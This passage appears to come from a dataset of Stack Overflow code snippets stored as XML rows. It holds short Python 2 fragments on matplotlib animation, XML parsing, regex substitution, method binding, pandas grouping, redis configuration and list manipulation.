

max_height = 100
n_pts = 100
y1 = [0, max_height]
x1 = [0, 0]
y = numpy.random.randn(n_pts) * max_height
x = numpy.arange(0, n_pts)

# draw the data
line1, = ax.plot(x, y, color='black')

# fix the limits of the plot
ax.set_ylim(0, max_height)
ax.set_xlim(0, n_pts)

# draw the plot so that we can capture the background and then use blitting
plt.show(block=False)

# get the canvas object
canvas = ax.figure.canvas
background = canvas.copy_from_bbox(ax.bbox)

# add the progress line.
# XXX consider using axvline
line, = ax.plot(x1, y1, color='r', animated=True) 


starttime=time.time()
mytimer=0
mytimer_ref=0

def update(canvas, line, ax):
    # revert the canvas to the state before any progress line was drawn
    canvas.restore_region(background)

    # compute the distance that the progress line has made (based on running time) 
    t = time.time() - starttime
    mytimer = t + mytimer_ref
    x1 = [mytimer,mytimer]
    # update the progress line with its new position
    line.set_xdata(x1)
    # draw the line, and blit the axes
    ax.draw_artist(line)
    canvas.blit(ax.bbox)

def onclick(event):
    global starttime
    starttime=time.time()
    global mytimer_ref
    mytimer_ref=event.xdata
    print "starttime",starttime


cid=line1.figure.canvas.mpl_connect('button_press_event',onclick) # when i click the mouse over a point, line goes to that point and start moving from there. 
timer=fig.canvas.new_timer(interval=100)
args=[canvas,line,ax]
timer.add_callback(update,*args) # every 100ms it calls update function
timer.start()
plt.show()
</snippet></ROW><ROW><id>11948315</id><snippet>threading</snippet></ROW><ROW><id>11948473</id><snippet>from xml.dom.minidom import parseString
from os.path import basename

dom = parseString(raw_xml)

feature = {}
for f in dom.getElementsByTagName('feature'):
    name = basename(f.getAttribute('name'))
    state = f.getAttribute('state').lower() == 'true'
    feature[name] = state
</snippet></ROW><ROW><id>11948473</id><snippet>dict([(basename(f.getAttribute('name')), f.getAttribute('state').lower() == 'true')
  for f in parseString(raw).getElementsByTagName('feature')])
</snippet></ROW><ROW><id>11948698</id><snippet>from select import select</snippet></ROW><ROW><id>11949325</id><snippet>def precache_wsdl(wsdl,principal):
    log = logging.getLogger()
    log.setLevel = logging.info
    cache_location = os.path.join(os.path.dirname(__file__),"cache")
    security = Security()
    token = UsernameToken(*principal)
    security.tokens.append(token)
    client = Client(wsdl,cache=FileCache(cache_location))
    client.set_options(wsse=security)
</snippet></ROW><ROW><id>11949362</id><snippet>pygame.py</snippet></ROW><ROW><id>11949362</id><snippet>pygame.pyc</snippet></ROW><ROW><id>11949362</id><snippet>import pygame</snippet></ROW><ROW><id>11949362</id><snippet>locals</snippet></ROW><ROW><id>11949362</id><snippet>pygame.py</snippet></ROW><ROW><id>11949362</id><snippet>pygame.pyc</snippet></ROW><ROW><id>11949372</id><snippet>**settings</snippet></ROW><ROW><id>11949372</id><snippet>Configurator</snippet></ROW><ROW><id>11949372</id><snippet>request.registry.settings</snippet></ROW><ROW><id>11949372</id><snippet>request.registry.settings</snippet></ROW><ROW><id>11949561</id><snippet>r'\1was\212345\3'</snippet></ROW><ROW><id>11949561</id><snippet>b'\212'</snippet></ROW><ROW><id>11949561</id><snippet>b'\x8a'</snippet></ROW><ROW><id>11949561</id><snippet>\g&lt;GROUP_NUMBER_HERE&gt;</snippet></ROW><ROW><id>11949561</id><snippet>&gt;&gt;&gt; re.sub('(.*)is(.*)want(.*)','\\g&lt;1&gt;%s\\g&lt;2&gt;%s\\g&lt;3&gt;' %('was','12345'),a)
'this was the string i 12345 to change'
</snippet></ROW><ROW><id>11950080</id><snippet>def</snippet></ROW><ROW><id>11950080</id><snippet>lambda</snippet></ROW><ROW><id>11950080</id><snippet>class</snippet></ROW><ROW><id>11950080</id><snippet>type</snippet></ROW><ROW><id>11950080</id><snippet>self</snippet></ROW><ROW><id>11950080</id><snippet>def f1(self):
    pass
</snippet></ROW><ROW><id>11950080</id><snippet>f1</snippet></ROW><ROW><id>11950080</id><snippet>class C(object):
    f1 = f1
</snippet></ROW><ROW><id>11950080</id><snippet>C.f1</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; C.f1
&lt;unbound method C.f1&gt;
&gt;&gt;&gt; C.f1.im_func is f1
True
</snippet></ROW><ROW><id>11950080</id><snippet>type</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; C2 = type('C2', (object,), {'f1': f1})
&gt;&gt;&gt; C2.f1
&lt;unbound method C2.f1&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>f1</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; import types
&gt;&gt;&gt; types.MethodType(f1, None, C)
&lt;unbound method C.f1&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; C().f1
&lt;bound method C.f1 of &lt;__main__.C object at 0x2abeecf87250&gt;&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; C.f1.__get__(C(), C)
&lt;bound method C.f1 of &lt;__main__.C object at 0x2abeecf871d0&gt;&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; types.MethodType(f1, None, C).__get__(C(), C)
&lt;bound method C.f1 of &lt;__main__.C object at 0x2abeecf87310&gt;&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>&gt;&gt;&gt; types.MethodType(f1, C(), C)                
&lt;bound method C.f1 of &lt;__main__.C object at 0x2abeecf871d0&gt;&gt;
</snippet></ROW><ROW><id>11950080</id><snippet>f1(C())
C.f1(C())
C().f1()
</snippet></ROW><ROW><id>11950080</id><snippet>self</snippet></ROW><ROW><id>11950080</id><snippet>C().f1</snippet></ROW><ROW><id>11950080</id><snippet>(lamdba *args, **kwargs: f1(C(), *args, **kwargs))
functools.partial(f1, C())
</snippet></ROW><ROW><id>11950085</id><snippet>rawdoglib.feedparser.py</snippet></ROW><ROW><id>11950085</id><snippet>rawdog</snippet></ROW><ROW><id>11950085</id><snippet>smglib</snippet></ROW><ROW><id>11950085</id><snippet>if sgmllib.endbracket.search(' &lt;').start(0):
    class EndBracketMatch:
        endbracket = re.compile('''([^'"&lt;&gt;]|"[^"]*"(?=&gt;|/|\s|\w+=)|'[^']*'(?=&gt;|/|\s|\w+=))*(?=[&lt;&gt;])|.*?(?=[&lt;&gt;])''')
        def search(self,string,index=0):
            self.match = self.endbracket.match(string,index)
            if self.match: return self
        def start(self,n):
            return self.match.end(n)
    sgmllib.endbracket = EndBracketMatch()
</snippet></ROW><ROW><id>11950085</id><snippet>contents = '''&lt;a&gt;&lt;ar "none";                                                 
&lt;/a&gt; '''                                                                     
import BeautifulSoup as BS                                                   
print 'before rawdog: ', len(BS.BeautifulSoup(contents)) # prints 4, correct answer
from rawdoglib import rawdog as rd                                           
print 'after rawdog: ', len(BS.BeautifulSoup(contents)) # prints 3, incorrect
</snippet></ROW><ROW><id>11950085</id><snippet>for (var i=0; i&lt;ar.length; i++){</snippet></ROW><ROW><id>11950158</id><snippet>&gt;&gt;&gt; t = (('oranges',), ('apples',), ('pears',)    
&gt;&gt;&gt; dict((item[0], None) for item in t)
{'pears': None, 'apples': None, 'oranges': None}
</snippet></ROW><ROW><id>11950184</id><snippet>webapp2.Route(r'/products', handler='handlers.ProductsHandler', name='products-list', schemes=['https'])
</snippet></ROW><ROW><id>11950199</id><snippet>import math
import numpy as np
from pylab import *
from matplotlib import mpl
import matplotlib.pyplot as plt


aa_key = {'ARG':'R', 'HIS':'H', 'LYS':'K', 'ASP':'D', 'GLU':'E', 'SER':'S', 'THR':'T', 'ASN':'N', 'GLN':'Q', 'CYS':'C', 'SEC':'C', 'GLY':'G', 'PRO':'P', 'ALA':'A', 'VAL':'V', 'ILE':'I', 'LEU':'L', 'MET':'M', 'PHE':'F', 'TYR':'Y', 'TRP':'W'}


avg = [93.89, 69.34, 62.14, 33.65, 59.14, 41.73, 22.27, 0.81, 43.57, 5.12, 0.06, 32.58, 18.07, 77.43, 38.97, 83.38, 31.26, 75.33, 68.95, 142.75, 19.71, 0.16, 57.19, 59.74, 0.2, 27.25, 125.09, 116.5, 7.9, 7.49, 131.04, 64.21, 18.45, 62.13, 51.68, 96.93, 80.49, 35.64, 153.67, 28.97, 117.85, 67.19, 4.77, 86.98, 40.65, 56.09, 28.04, 97.77, 25.68, 0.0, 21.36, 47.02, 0.0, 37.21, 66.44, 4.63, 5.51, 43.05, 42.99, 125.41, 100.06, 91.02, 59.16, 32.02, 63.1, 0.58, 5.66, 54.43, 40.13, 67.42, 74.4, 76.45, 105.18, 68.41, 75.86, 74.01, 103.7, 117.79, 90.08, 139.55, 89.3, 136.44, 104.58, 105.68, 42.46, 91.42, 35.22, 93.86, 48.37, 120.37, 66.23, 50.54, 64.71, 41.54, 71.54, 49.17, 60.97, 85.65, 111.92, 51.99, 53.2, 113.7, 126.62, 38.5, 102.27, 116.62, 60.34, 131.57, 78.68, 46.47, 120.32, 90.04, 122.09, 126.92, 72.98, 65.15, 82.23, 20.38, 50.95, 39.32, 20.96, 75.01, 14.44, 88.34, 1.94, 51.8, 2.06, 90.28, 3.36, 64.76, 31.06, 0.51, 29.15, 87.07, 84.27, 65.24, 128.51, 38.39, 94.71, 16.21, 85.0, 31.2, 59.57, 6.18, 33.06, 33.73, 60.79, 61.36, 95.3, 197.35, 26.78, 112.83, 64.85, 131.5, 97.56, 94.93, 79.31, 95.74, 60.12, 89.47, 19.11, 87.26, 16.72, 110.99, 1.96, 33.8, 18.2, 21.86, 13.52, 24.27, 62.86, 31.47, 39.23, 80.43, 38.0, 85.39, 48.59, 136.98, 35.9, 45.6, 4.45, 17.14, 70.42, 34.51, 124.57, 116.16, 66.84, 23.42, 109.71, 58.46, 6.64, 11.81, 0.2, 43.98, 0.2, 15.75, 2.59, 47.25, 11.7, 30.86, 81.7, 30.13, 104.47, 69.54, 7.08, 67.92, 56.72, 63.09, 47.24, 45.87, 23.58, 0.05, 41.5, 3.43, 72.93, 5.42, 60.21, 1.23, 20.09, 1.81, 39.74, 47.41, 0.08, 3.54, 67.77, 19.85, 26.79, 124.72, 33.09, 78.66, 0.99, 55.68, 13.74, 16.07, 119.38, 93.24, 64.98, 43.75, 107.65, 14.95, 69.54, 3.25, 68.41, 56.43, 16.03, 4.43, 61.51, 24.86, 46.78, 43.31, 87.59, 24.02, 108.74, 15.55, 128.87, 35.05, 31.09, 3.57, 6.79, 40.17, 23.66, 116.78, 131.23, 81.16, 58.18, 3.68, 13.18, 0.0, 28.06, 0.0, 25.68, 3.37, 51.95, 1.15, 24.84, 4.6, 22.33, 33.47, 108.62, 16.1, 49.53, 135.2, 71.43, 5.79, 15.91, 48.61, 13.73, 9.4, 87.11, 63.19, 7.91, 21.25, 94.15, 45.86, 26.36, 80.05, 105.57, 52.3, 51.13, 56.83, 113.51, 92.92, 67.0, 148.45, 35.13, 114.23, 108.02, 94.94, 68.44, 62.22, 31.15, 60.04, 38.47, 22.3, 0.78, 39.35, 4.7, 0.09, 28.1, 17.58, 73.04, 37.55, 83.03, 31.78, 75.43, 69.08, 142.08, 19.87, 0.12, 57.8, 56.07, 0.33, 27.34, 124.44, 98.74, 6.57, 7.63, 126.51, 54.26, 16.13, 62.16, 51.03, 96.26, 78.31, 33.71, 142.46, 25.05, 101.93, 59.35, 5.0, 82.65, 36.26, 52.16, 27.37, 96.5, 24.5, 0.0, 21.25, 46.08, 0.0, 37.11, 62.57, 4.14, 5.19, 40.52, 38.78, 122.3, 97.2, 87.08, 57.43, 31.35, 61.98, 0.47, 5.45, 52.48, 41.73, 61.9, 73.38, 76.32, 104.43, 69.92, 78.78, 76.66, 107.05, 121.75, 91.06, 137.56, 91.2, 135.56, 107.81, 103.62, 41.7, 91.29, 35.24, 95.06, 48.72, 120.38, 65.02, 51.42, 63.83, 42.03, 72.09, 46.49, 58.56, 88.6, 111.84, 51.98, 53.78, 113.33, 126.69, 39.08, 101.86, 118.26, 59.34, 131.83, 79.09, 46.05, 119.72, 88.5, 121.97, 124.3, 72.72, 64.42, 83.82, 21.05, 52.81, 39.94, 21.72, 74.56, 12.92, 83.91, 1.73, 50.29, 1.86, 90.79, 3.81, 63.99, 31.36, 0.57, 29.63, 84.77, 89.53, 63.56, 125.84, 35.8, 92.01, 15.26, 83.0, 30.76, 59.25, 6.29, 34.43, 33.28, 62.53, 61.09, 95.55, 196.45, 27.62, 113.44, 63.2, 129.38, 94.13, 92.39, 78.32, 91.58, 60.28, 89.43, 19.21, 88.07, 16.92, 114.43, 1.85, 41.76, 18.49, 24.06, 14.87, 26.1, 62.6, 33.32, 47.49, 87.78, 43.66, 89.01, 50.82, 137.19, 36.07, 45.04, 4.74, 17.27, 70.76, 34.06, 122.94, 115.74, 67.75, 22.31, 109.71, 58.98, 6.2, 11.94, 0.17, 44.87, 0.2, 13.79, 2.98, 45.03, 10.99, 29.79, 79.91, 29.46, 100.54, 66.28, 6.74, 68.25, 56.62, 70.73, 50.56, 58.69, 26.22, 0.2, 42.1, 2.29, 65.71, 5.29, 54.8, 0.74, 17.54, 1.47, 28.1, 38.62, 0.3, 4.99, 67.47, 18.73, 25.92, 125.97, 26.34, 60.35, 0.94, 52.67, 13.45, 15.84, 117.19, 92.53, 62.5, 43.79, 106.85, 16.62, 71.9, 2.93, 68.08, 71.72, 10.62, 4.19, 46.87, 24.12, 47.09, 42.94, 92.39, 26.66, 109.61, 13.34, 129.23, 34.47, 31.0, 3.22, 7.69, 42.03, 28.05, 149.01, 156.76, 92.83, 57.73, 3.86, 14.9, 0.0, 29.23, 0.03, 25.92, 3.87, 45.65, 1.09, 20.81, 3.66, 27.06, 28.97, 94.28, 12.82, 63.89, 134.81, 81.96, 10.38, 17.27, 47.6, 23.26, 11.64, 94.27, 71.8, 2.46, 33.86, 93.88, 44.6, 20.61, 80.47, 97.13, 47.26, 50.87, 56.86, 126.64, 84.4, 57.84, 167.2, 37.38, 118.34, 106.89]
aa = ['ALA', 'SER', 'ALA', 'LEU', 'LYS', 'ASP', 'TYR', 'TYR', 'ALA', 'ILE', 'MET', 'GLY', 'VAL', 'LYS', 'PRO', 'THR', 'ASP', 'ASP', 'LEU', 'LYS', 'THR', 'ILE', 'LYS', 'THR', 'ALA', 'TYR', 'ARG', 'ARG', 'LEU', 'ALA', 'ARG', 'LYS', 'TYR', 'HIS', 'PRO', 'ASP', 'VAL', 'SER', 'LYS', 'GLU', 'PRO', 'ASP', 'ALA', 'GLU', 'ALA', 'ARG', 'PHE', 'LYS', 'GLU', 'VAL', 'ALA', 'GLU', 'ALA', 'TRP', 'GLU', 'VAL', 'LEU', 'SER', 'ASP', 'GLU', 'GLN', 'ARG', 'ARG', 'ALA', 'GLU', 'TYR', 'ASP', 'GLN', 'MET', 'TRP', 'GLN', 'HIS', 'ARG', 'ASN', 'ASP', 'PRO', 'GLN', 'PHE', 'ASN', 'ARG', 'GLN', 'PHE', 'HIS', 'HIS', 'GLY', 'ASP', 'GLY', 'GLN', 'SER', 'PHE', 'ASN', 'ALA', 'GLU', 'ASP', 'PHE', 'ASP', 'ASP', 'ILE', 'PHE', 'SER', 'SER', 'ILE', 'PHE', 'GLY', 'GLN', 'HIS', 'ALA', 'ARG', 'GLN', 'SER', 'ARG', 'GLN', 'ARG', 'PRO', 'ALA', 'THR', 'ARG', 'GLY', 'HIS', 'ASP', 'ILE', 'GLU', 'ILE', 'GLU', 'VAL', 'ALA', 'VAL', 'PHE', 'LEU', 'GLU', 'GLU', 'THR', 'LEU', 'THR', 'GLU', 'HIS', 'LYS', 'ARG', 'THR', 'ILE', 'SER', 'TYR', 'ASN', 'LEU', 'PRO', 'VAL', 'TYR', 'ASN', 'ALA', 'PHE', 'GLY', 'MET', 'ILE', 'GLU', 'GLN', 'GLU', 'ILE', 'PRO', 'LYS', 'THR', 'LEU', 'ASN', 'VAL', 'LYS', 'ILE', 'PRO', 'ALA', 'GLY', 'VAL', 'GLY', 'ASN', 'GLY', 'GLN', 'ARG', 'ILE', 'ARG', 'LEU', 'LYS', 'GLY', 'GLN', 'GLY', 'THR', 'PRO', 'GLY', 'GLU', 'ASN', 'GLY', 'GLY', 'PRO', 'ASN', 'GLY', 'ASP', 'LEU', 'TRP', 'LEU', 'VAL', 'ILE', 'HIS', 'ILE', 'ALA', 'PRO', 'HIS', 'PRO', 'LEU', 'PHE', 'ASP', 'ILE', 'VAL', 'GLY', 'GLN', 'ASP', 'LEU', 'GLU', 'ILE', 'VAL', 'VAL', 'PRO', 'VAL', 'SER', 'PRO', 'TRP', 'GLU', 'ALA', 'ALA', 'LEU', 'GLY', 'ALA', 'LYS', 'VAL', 'THR', 'VAL', 'PRO', 'THR', 'LEU', 'LYS', 'GLU', 'SER', 'ILE', 'LEU', 'LEU', 'THR', 'ILE', 'PRO', 'PRO', 'GLY', 'SER', 'GLN', 'ALA', 'GLY', 'GLN', 'ARG', 'LEU', 'ARG', 'VAL', 'LYS', 'GLY', 'LYS', 'GLY', 'LEU', 'VAL', 'SER', 'LYS', 'LYS', 'GLN', 'THR', 'GLY', 'ASP', 'LEU', 'TYR', 'ALA', 'VAL', 'LEU', 'LYS', 'ILE', 'VAL', 'MET', 'PRO', 'PRO', 'LYS', 'PRO', 'ASP', 'GLU', 'ASN', 'THR', 'ALA', 'ALA', 'LEU', 'TRP', 'GLN', 'GLN', 'LEU', 'ALA', 'ASP', 'ALA', 'GLN', 'SER', 'SER', 'PHE', 'ASP', 'PRO', 'ARG', 'LYS', 'ASP', 'TRP', 'GLY', 'LYS', 'ALA', 'ALA', 'SER', 'ALA', 'LEU', 'LYS', 'ASP', 'TYR', 'TYR', 'ALA', 'ILE', 'MET', 'GLY', 'VAL', 'LYS', 'PRO', 'THR', 'ASP', 'ASP', 'LEU', 'LYS', 'THR', 'ILE', 'LYS', 'THR', 'ALA', 'TYR', 'ARG', 'ARG', 'LEU', 'ALA', 'ARG', 'LYS', 'TYR', 'HIS', 'PRO', 'ASP', 'VAL', 'SER', 'LYS', 'GLU', 'PRO', 'ASP', 'ALA', 'GLU', 'ALA', 'ARG', 'PHE', 'LYS', 'GLU', 'VAL', 'ALA', 'GLU', 'ALA', 'TRP', 'GLU', 'VAL', 'LEU', 'SER', 'ASP', 'GLU', 'GLN', 'ARG', 'ARG', 'ALA', 'GLU', 'TYR', 'ASP', 'GLN', 'MET', 'TRP', 'GLN', 'HIS', 'ARG', 'ASN', 'ASP', 'PRO', 'GLN', 'PHE', 'ASN', 'ARG', 'GLN', 'PHE', 'HIS', 'HIS', 'GLY', 'ASP', 'GLY', 'GLN', 'SER', 'PHE', 'ASN', 'ALA', 'GLU', 'ASP', 'PHE', 'ASP', 'ASP', 'ILE', 'PHE', 'SER', 'SER', 'ILE', 'PHE', 'GLY', 'GLN', 'HIS', 'ALA', 'ARG', 'GLN', 'SER', 'ARG', 'GLN', 'ARG', 'PRO', 'ALA', 'THR', 'ARG', 'GLY', 'HIS', 'ASP', 'ILE', 'GLU', 'ILE', 'GLU', 'VAL', 'ALA', 'VAL', 'PHE', 'LEU', 'GLU', 'GLU', 'THR', 'LEU', 'THR', 'GLU', 'HIS', 'LYS', 'ARG', 'THR', 'ILE', 'SER', 'TYR', 'ASN', 'LEU', 'PRO', 'VAL', 'TYR', 'ASN', 'ALA', 'PHE', 'GLY', 'MET', 'ILE', 'GLU', 'GLN', 'GLU', 'ILE', 'PRO', 'LYS', 'THR', 'LEU', 'ASN', 'VAL', 'LYS', 'ILE', 'PRO', 'ALA', 'GLY', 'VAL', 'GLY', 'ASN', 'GLY', 'GLN', 'ARG', 'ILE', 'ARG', 'LEU', 'LYS', 'GLY', 'GLN', 'GLY', 'THR', 'PRO', 'GLY', 'GLU', 'ASN', 'GLY', 'GLY', 'PRO', 'ASN', 'GLY', 'ASP', 'LEU', 'TRP', 'LEU', 'VAL', 'ILE', 'HIS', 'ILE', 'ALA', 'PRO', 'HIS', 'PRO', 'LEU', 'PHE', 'ASP', 'ILE', 'VAL', 'GLY', 'GLN', 'ASP', 'LEU', 'GLU', 'ILE', 'VAL', 'VAL', 'PRO', 'VAL', 'SER', 'PRO', 'TRP', 'GLU', 'ALA', 'ALA', 'LEU', 'GLY', 'ALA', 'LYS', 'VAL', 'THR', 'VAL', 'PRO', 'THR', 'LEU', 'LYS', 'GLU', 'SER', 'ILE', 'LEU', 'LEU', 'THR', 'ILE', 'PRO', 'PRO', 'GLY', 'SER', 'GLN', 'ALA', 'GLY', 'GLN', 'ARG', 'LEU', 'ARG', 'VAL', 'LYS', 'GLY', 'LYS', 'GLY', 'LEU', 'VAL', 'SER', 'LYS', 'LYS', 'GLN', 'THR', 'GLY', 'ASP', 'LEU', 'TYR', 'ALA', 'VAL', 'LEU', 'LYS', 'ILE', 'VAL', 'MET', 'PRO', 'PRO', 'LYS', 'PRO', 'ASP', 'GLU', 'ASN', 'THR', 'ALA', 'ALA', 'LEU', 'TRP', 'GLN', 'GLN', 'LEU', 'ALA', 'ASP', 'ALA', 'GLN', 'SER', 'SER', 'PHE', 'ASP', 'PRO', 'ARG', 'LYS', 'ASP', 'TRP', 'GLY', 'LYS', 'ALA']
colours = ['#FFFFFF','#CCFFFF','#99FFFF','#00CCFF','#0099FF','#0066FF','#0033FF','#0000CC','#000066']

high_val = max(avg)
boundaries = np.linspace(0, np.max(avg), 10)[1:]
rows = math.ceil(len(aa)/40.0)
list_numbers = set(range(1, len(aa), 10))

fig = plt.figure(figsize=(10, 10), facecolor="white")
ax = plt.subplot(111)
ax.set_axis_off()
color_index = np.searchsorted(boundaries, avg)
x, y = 0, -1
for i in xrange(len(aa)):
    rect = plt.Rectangle((x, y), 1, 1, facecolor=colours[color_index[i]])
    ax.add_artist(rect)
    ax.text(x+0.5, y+0.5, aa_key[aa[i]], ha="center", va="center", color="white" if color_index[i]==8 else "black")
    if i+1 in list_numbers:
        ax.text(x+0.5, y+1.6, "%d" % (i+1), ha="center", va="center")
    x += 1
    if x == 40:
        y -= 3.0
        x = 0
ax.set_xlim(-1, 41)
ax.set_ylim(y-3, 3)

a = np.linspace(0, high_val, 9)
a = np.vstack((a,a))
cmap = mpl.colors.ListedColormap(['#FFFFFF','#CCFFFF','#99FFFF','#00CCFF','#0099FF','#0066FF','#0033FF','#0000CC','#000066'])  
im = imshow(a, aspect='auto', cmap=plt.get_cmap(cmap), origin='lower')       
im.set_visible(False)  
colorbar()
plt.show()
</snippet></ROW><ROW><id>11950214</id><snippet>In [194]: cache = {}

In [195]: df.groupby(lambda d: cache.setdefault(d.isocalendar()[:2], d)).agg(agg)
Out[195]:
             close    high     low    open     volume
2012-02-13  0.3546  0.3592  0.3271  0.3476  648333934
2012-02-20  0.3575  0.3682  0.3524  0.3590  264673454
</snippet></ROW><ROW><id>11950550</id><snippet>find</snippet></ROW><ROW><id>11950550</id><snippet>{ 
_id {"$oid": "502186421fe3321dfa000001"}
} 
</snippet></ROW><ROW><id>11950550</id><snippet>car['_id']</snippet></ROW><ROW><id>11950634</id><snippet>import datetime
from itertools import groupby

def get_week(date):
    return date.isocalendar()[1]

def group_by_month(weeks, year):
    """
    Group a list containing one item per week, starting with week 1, by month.

    If there are too few items to fill a year, stop after last item.
    If there are more items than weeks in the year, stop before new year.
    """
    day = datetime.timedelta(days=1)
    week = datetime.timedelta(days=7)

    # Find first Thursday (it's in week 1 by ISO 8601)
    date = datetime.date(year, 1, 1)
    while date.weekday() != 3:
        date += day

    # Create list of one day from each week
    thursdays = []
    while date.year == year:
        thursdays.append(date)
        date += week

    # Check if the last day is in the last week and if not, 
    # add the week of the last day
    last = tursdays[-1]
    if get_week(last.replace(day=31)) != get_week(last):
        # this will not be a Thursday, but what the hey
        thursdays.append(last.replace(day=31))

    # The thursdays are already sorted by month, so 
    # it's OK to use groupby without sorting first
    for k, g in groupby(zip(weeks, thursdays), key=lambda x: x[1].month):
        yield [x[0] for x in g]

list_1 = [500] * 52

print map(sum, group_by_month(list_1, 2012))
</snippet></ROW><ROW><id>11950634</id><snippet>[2000, 2000, 2500, 2000, 2500, 2000, 2000, 2500, 2000, 2000, 2500, 2000]
</snippet></ROW><ROW><id>11950657</id><snippet>CONFIG</snippet></ROW><ROW><id>11950657</id><snippet>config get &lt;option-name&gt;
</snippet></ROW><ROW><id>11950657</id><snippet>redis 127.0.0.1:6379&gt; config get maxmemory
1) "maxmemory"
2) "0"
</snippet></ROW><ROW><id>11950657</id><snippet>redis 127.0.0.1:6379&gt; config get maxmemory-policy
1) "maxmemory-policy"
2) "volatile-lru"
</snippet></ROW><ROW><id>11950657</id><snippet>&gt;&gt;&gt; import redis
&gt;&gt;&gt; c = redis.Redis()
&gt;&gt;&gt; print c.config_get('maxmemory')
{'maxmemory': '0'}
</snippet></ROW><ROW><id>11950728</id><snippet>getGraph</snippet></ROW><ROW><id>11950728</id><snippet>@cache_page</snippet></ROW><ROW><id>11950763</id><snippet>from Widget17_Sorter import Widget17_Sorter
...
my_widget = Widget17_Sorter(...)
my_widget.get_data_from_database(...)
</snippet></ROW><ROW><id>11950851</id><snippet>for entry in large:
    max_list=[]
    for z in zip(*entry[1]): 
        max_list.append(max(z))
    print max_list
    max_list.sort(reverse=True)
    print max_list

[6, 5, 8]
[8, 6, 5]
[2, 15, 5]
[15, 5, 2]
</snippet></ROW><ROW><id>11950851</id><snippet>zip(*entry[1])
</snippet></ROW><ROW><id>11950851</id><snippet>for entry in large: 
    max_list=[]
    for z in zip(*entry[1]): 
        max_list.append(max(abs(t) for t in z))
    print "Absolute max",max_list
    max_list.sort(reverse=True)
    print "Sorted Absolute Max",max_list
</snippet></ROW><ROW><id>11950851</id><snippet>large = [('5501', [(4, -5, 8), (6, -4, -6)]), ('2222', [(2, -4, 5), (1, -15, -4)])]
</snippet></ROW><ROW><id>11950851</id><snippet>Absolute max [6, 5, 8]
Sorted Absolute Max [8, 6, 5]
Absolute max [2, 15, 5]
Sorted Absolute Max [15, 5, 2]
</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; a=[1,2,3,]
&gt;&gt;&gt; b=[4,5,6,]
&gt;&gt;&gt; zip(a,b)
[(1, 4), (2, 5), (3, 6)]
</snippet></ROW><ROW><id>11950851</id><snippet>entry[1]</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; def printme(*a): 
...     for i in a: 
...         print i
... 
&gt;&gt;&gt; m=[(1,2,),(3,4,),(5,6,),]
&gt;&gt;&gt; printme(m)
[(1, 2), (3, 4), (5, 6)]
&gt;&gt;&gt; printme(*m)
(1, 2)
(3, 4)
(5, 6)
</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; entry=('5501', [(4, -5, 8), (6, -4, -6)])
&gt;&gt;&gt; entry[1]
[(4, -5, 8), (6, -4, -6)]
</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; zip(entry[1])
[((4, -5, 8),), ((6, -4, -6),)]
</snippet></ROW><ROW><id>11950851</id><snippet>*</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; zip(*entry[1])
[(4, 6), (-5, -4), (8, -6)]
</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; for z in zip(*entry[1]): 
...     print "I have",z
...     print "max is",max(z)
... 
I have (4, 6)
max is 6
I have (-5, -4)
max is -4
I have (8, -6)
max is 8
</snippet></ROW><ROW><id>11950851</id><snippet>max_list=[]
for z in zip(*entry[1]): 
    max_list.append(max(z))
print max_list
</snippet></ROW><ROW><id>11950851</id><snippet>[6, -4, 8]
</snippet></ROW><ROW><id>11950851</id><snippet>max_list.sort(reverse=True)
print max_list
</snippet></ROW><ROW><id>11950851</id><snippet>[8, 6, -4]
</snippet></ROW><ROW><id>11950851</id><snippet>z</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; for z in zip(*entry[1]): 
...     print z
...     new_z = []
...     for i in z: 
...         new_z.append(abs(i))
...     print new_z
... 
(4, 6)
[4, 6]
(-5, -4)
[5, 4]
(8, -6)
[8, 6]
</snippet></ROW><ROW><id>11950851</id><snippet>&gt;&gt;&gt; for z in zip(*entry[1]): 
...     print z
...     new_z=[abs(i) for i in z]
...     print new_z
... 
(4, 6)
[4, 6]
(-5, -4)
[5, 4]
(8, -6)
[8, 6]
</snippet></ROW><ROW><id>11950851</id><snippet>new_z</snippet></ROW><ROW><id>11950851</id><snippet>max(new_z)</snippet></ROW><ROW><id>11950851</id><snippet>max_list=[]
for z in zip(*entry[1]): 
    new_z=[abs(i) for i in z]
    max_list.append(max(new_z))       
print max_list
</snippet></ROW><ROW><id>11950851</id><snippet>[6, 5, 8]
</snippet></ROW><ROW><id>11950851</id><snippet>new_z=[abs(i) for i in z]
max_list.append(max(new_z)) 
</snippet></ROW><ROW><id>11950851</id><snippet>max_list.append(max( abs(t) for t in z ))
</snippet></ROW><ROW><id>11950851</id><snippet>for entry in large: 
    max_list=[]
    for z in zip(*entry[1]): 
        max_list.append(max(abs(t) for t in z))
    print "Absolute max",max_list
    max_list.sort(reverse=True)
    print "Sorted Absolute Max",max_list
</snippet></ROW><ROW><id>11951126</id><snippet>sent_list = db.GqlQuery("SELECT * FROM MailListNew WHERE active = True")
</snippet></ROW><ROW><id>11951126</id><snippet>sent_list = db.GqlQuery("SELECT __key__ FROM MailListNew WHERE active = True")
</snippet></ROW><ROW><id>11951252</id><snippet>for i in xrange(32, 128, 16):
    print 'chr:\t%s' % '\t'.join(map(chr, [i+j for j in range(16)]))
    print 'asc:\t%s' % '\t'.join(map(str, [i+j for j in range(16)]))
</snippet></ROW><ROW><id>11951252</id><snippet>for i in range(32, 128, 16):
    print('chr:\t%s', '\t'.join(map(chr, [i+j for j in range(16)])))
    print('asc:\t%s', '\t'.join(map(str, [i+j for j in range(16)])))
</snippet></ROW><ROW><id>11951530</id><snippet>if</snippet></ROW><ROW><id>11951530</id><snippet>def traverse(o, tree_types=(list, tuple)):
    if isinstance(o, tree_types):
        if len(o) == 0:
            yield ''
        for value in o:
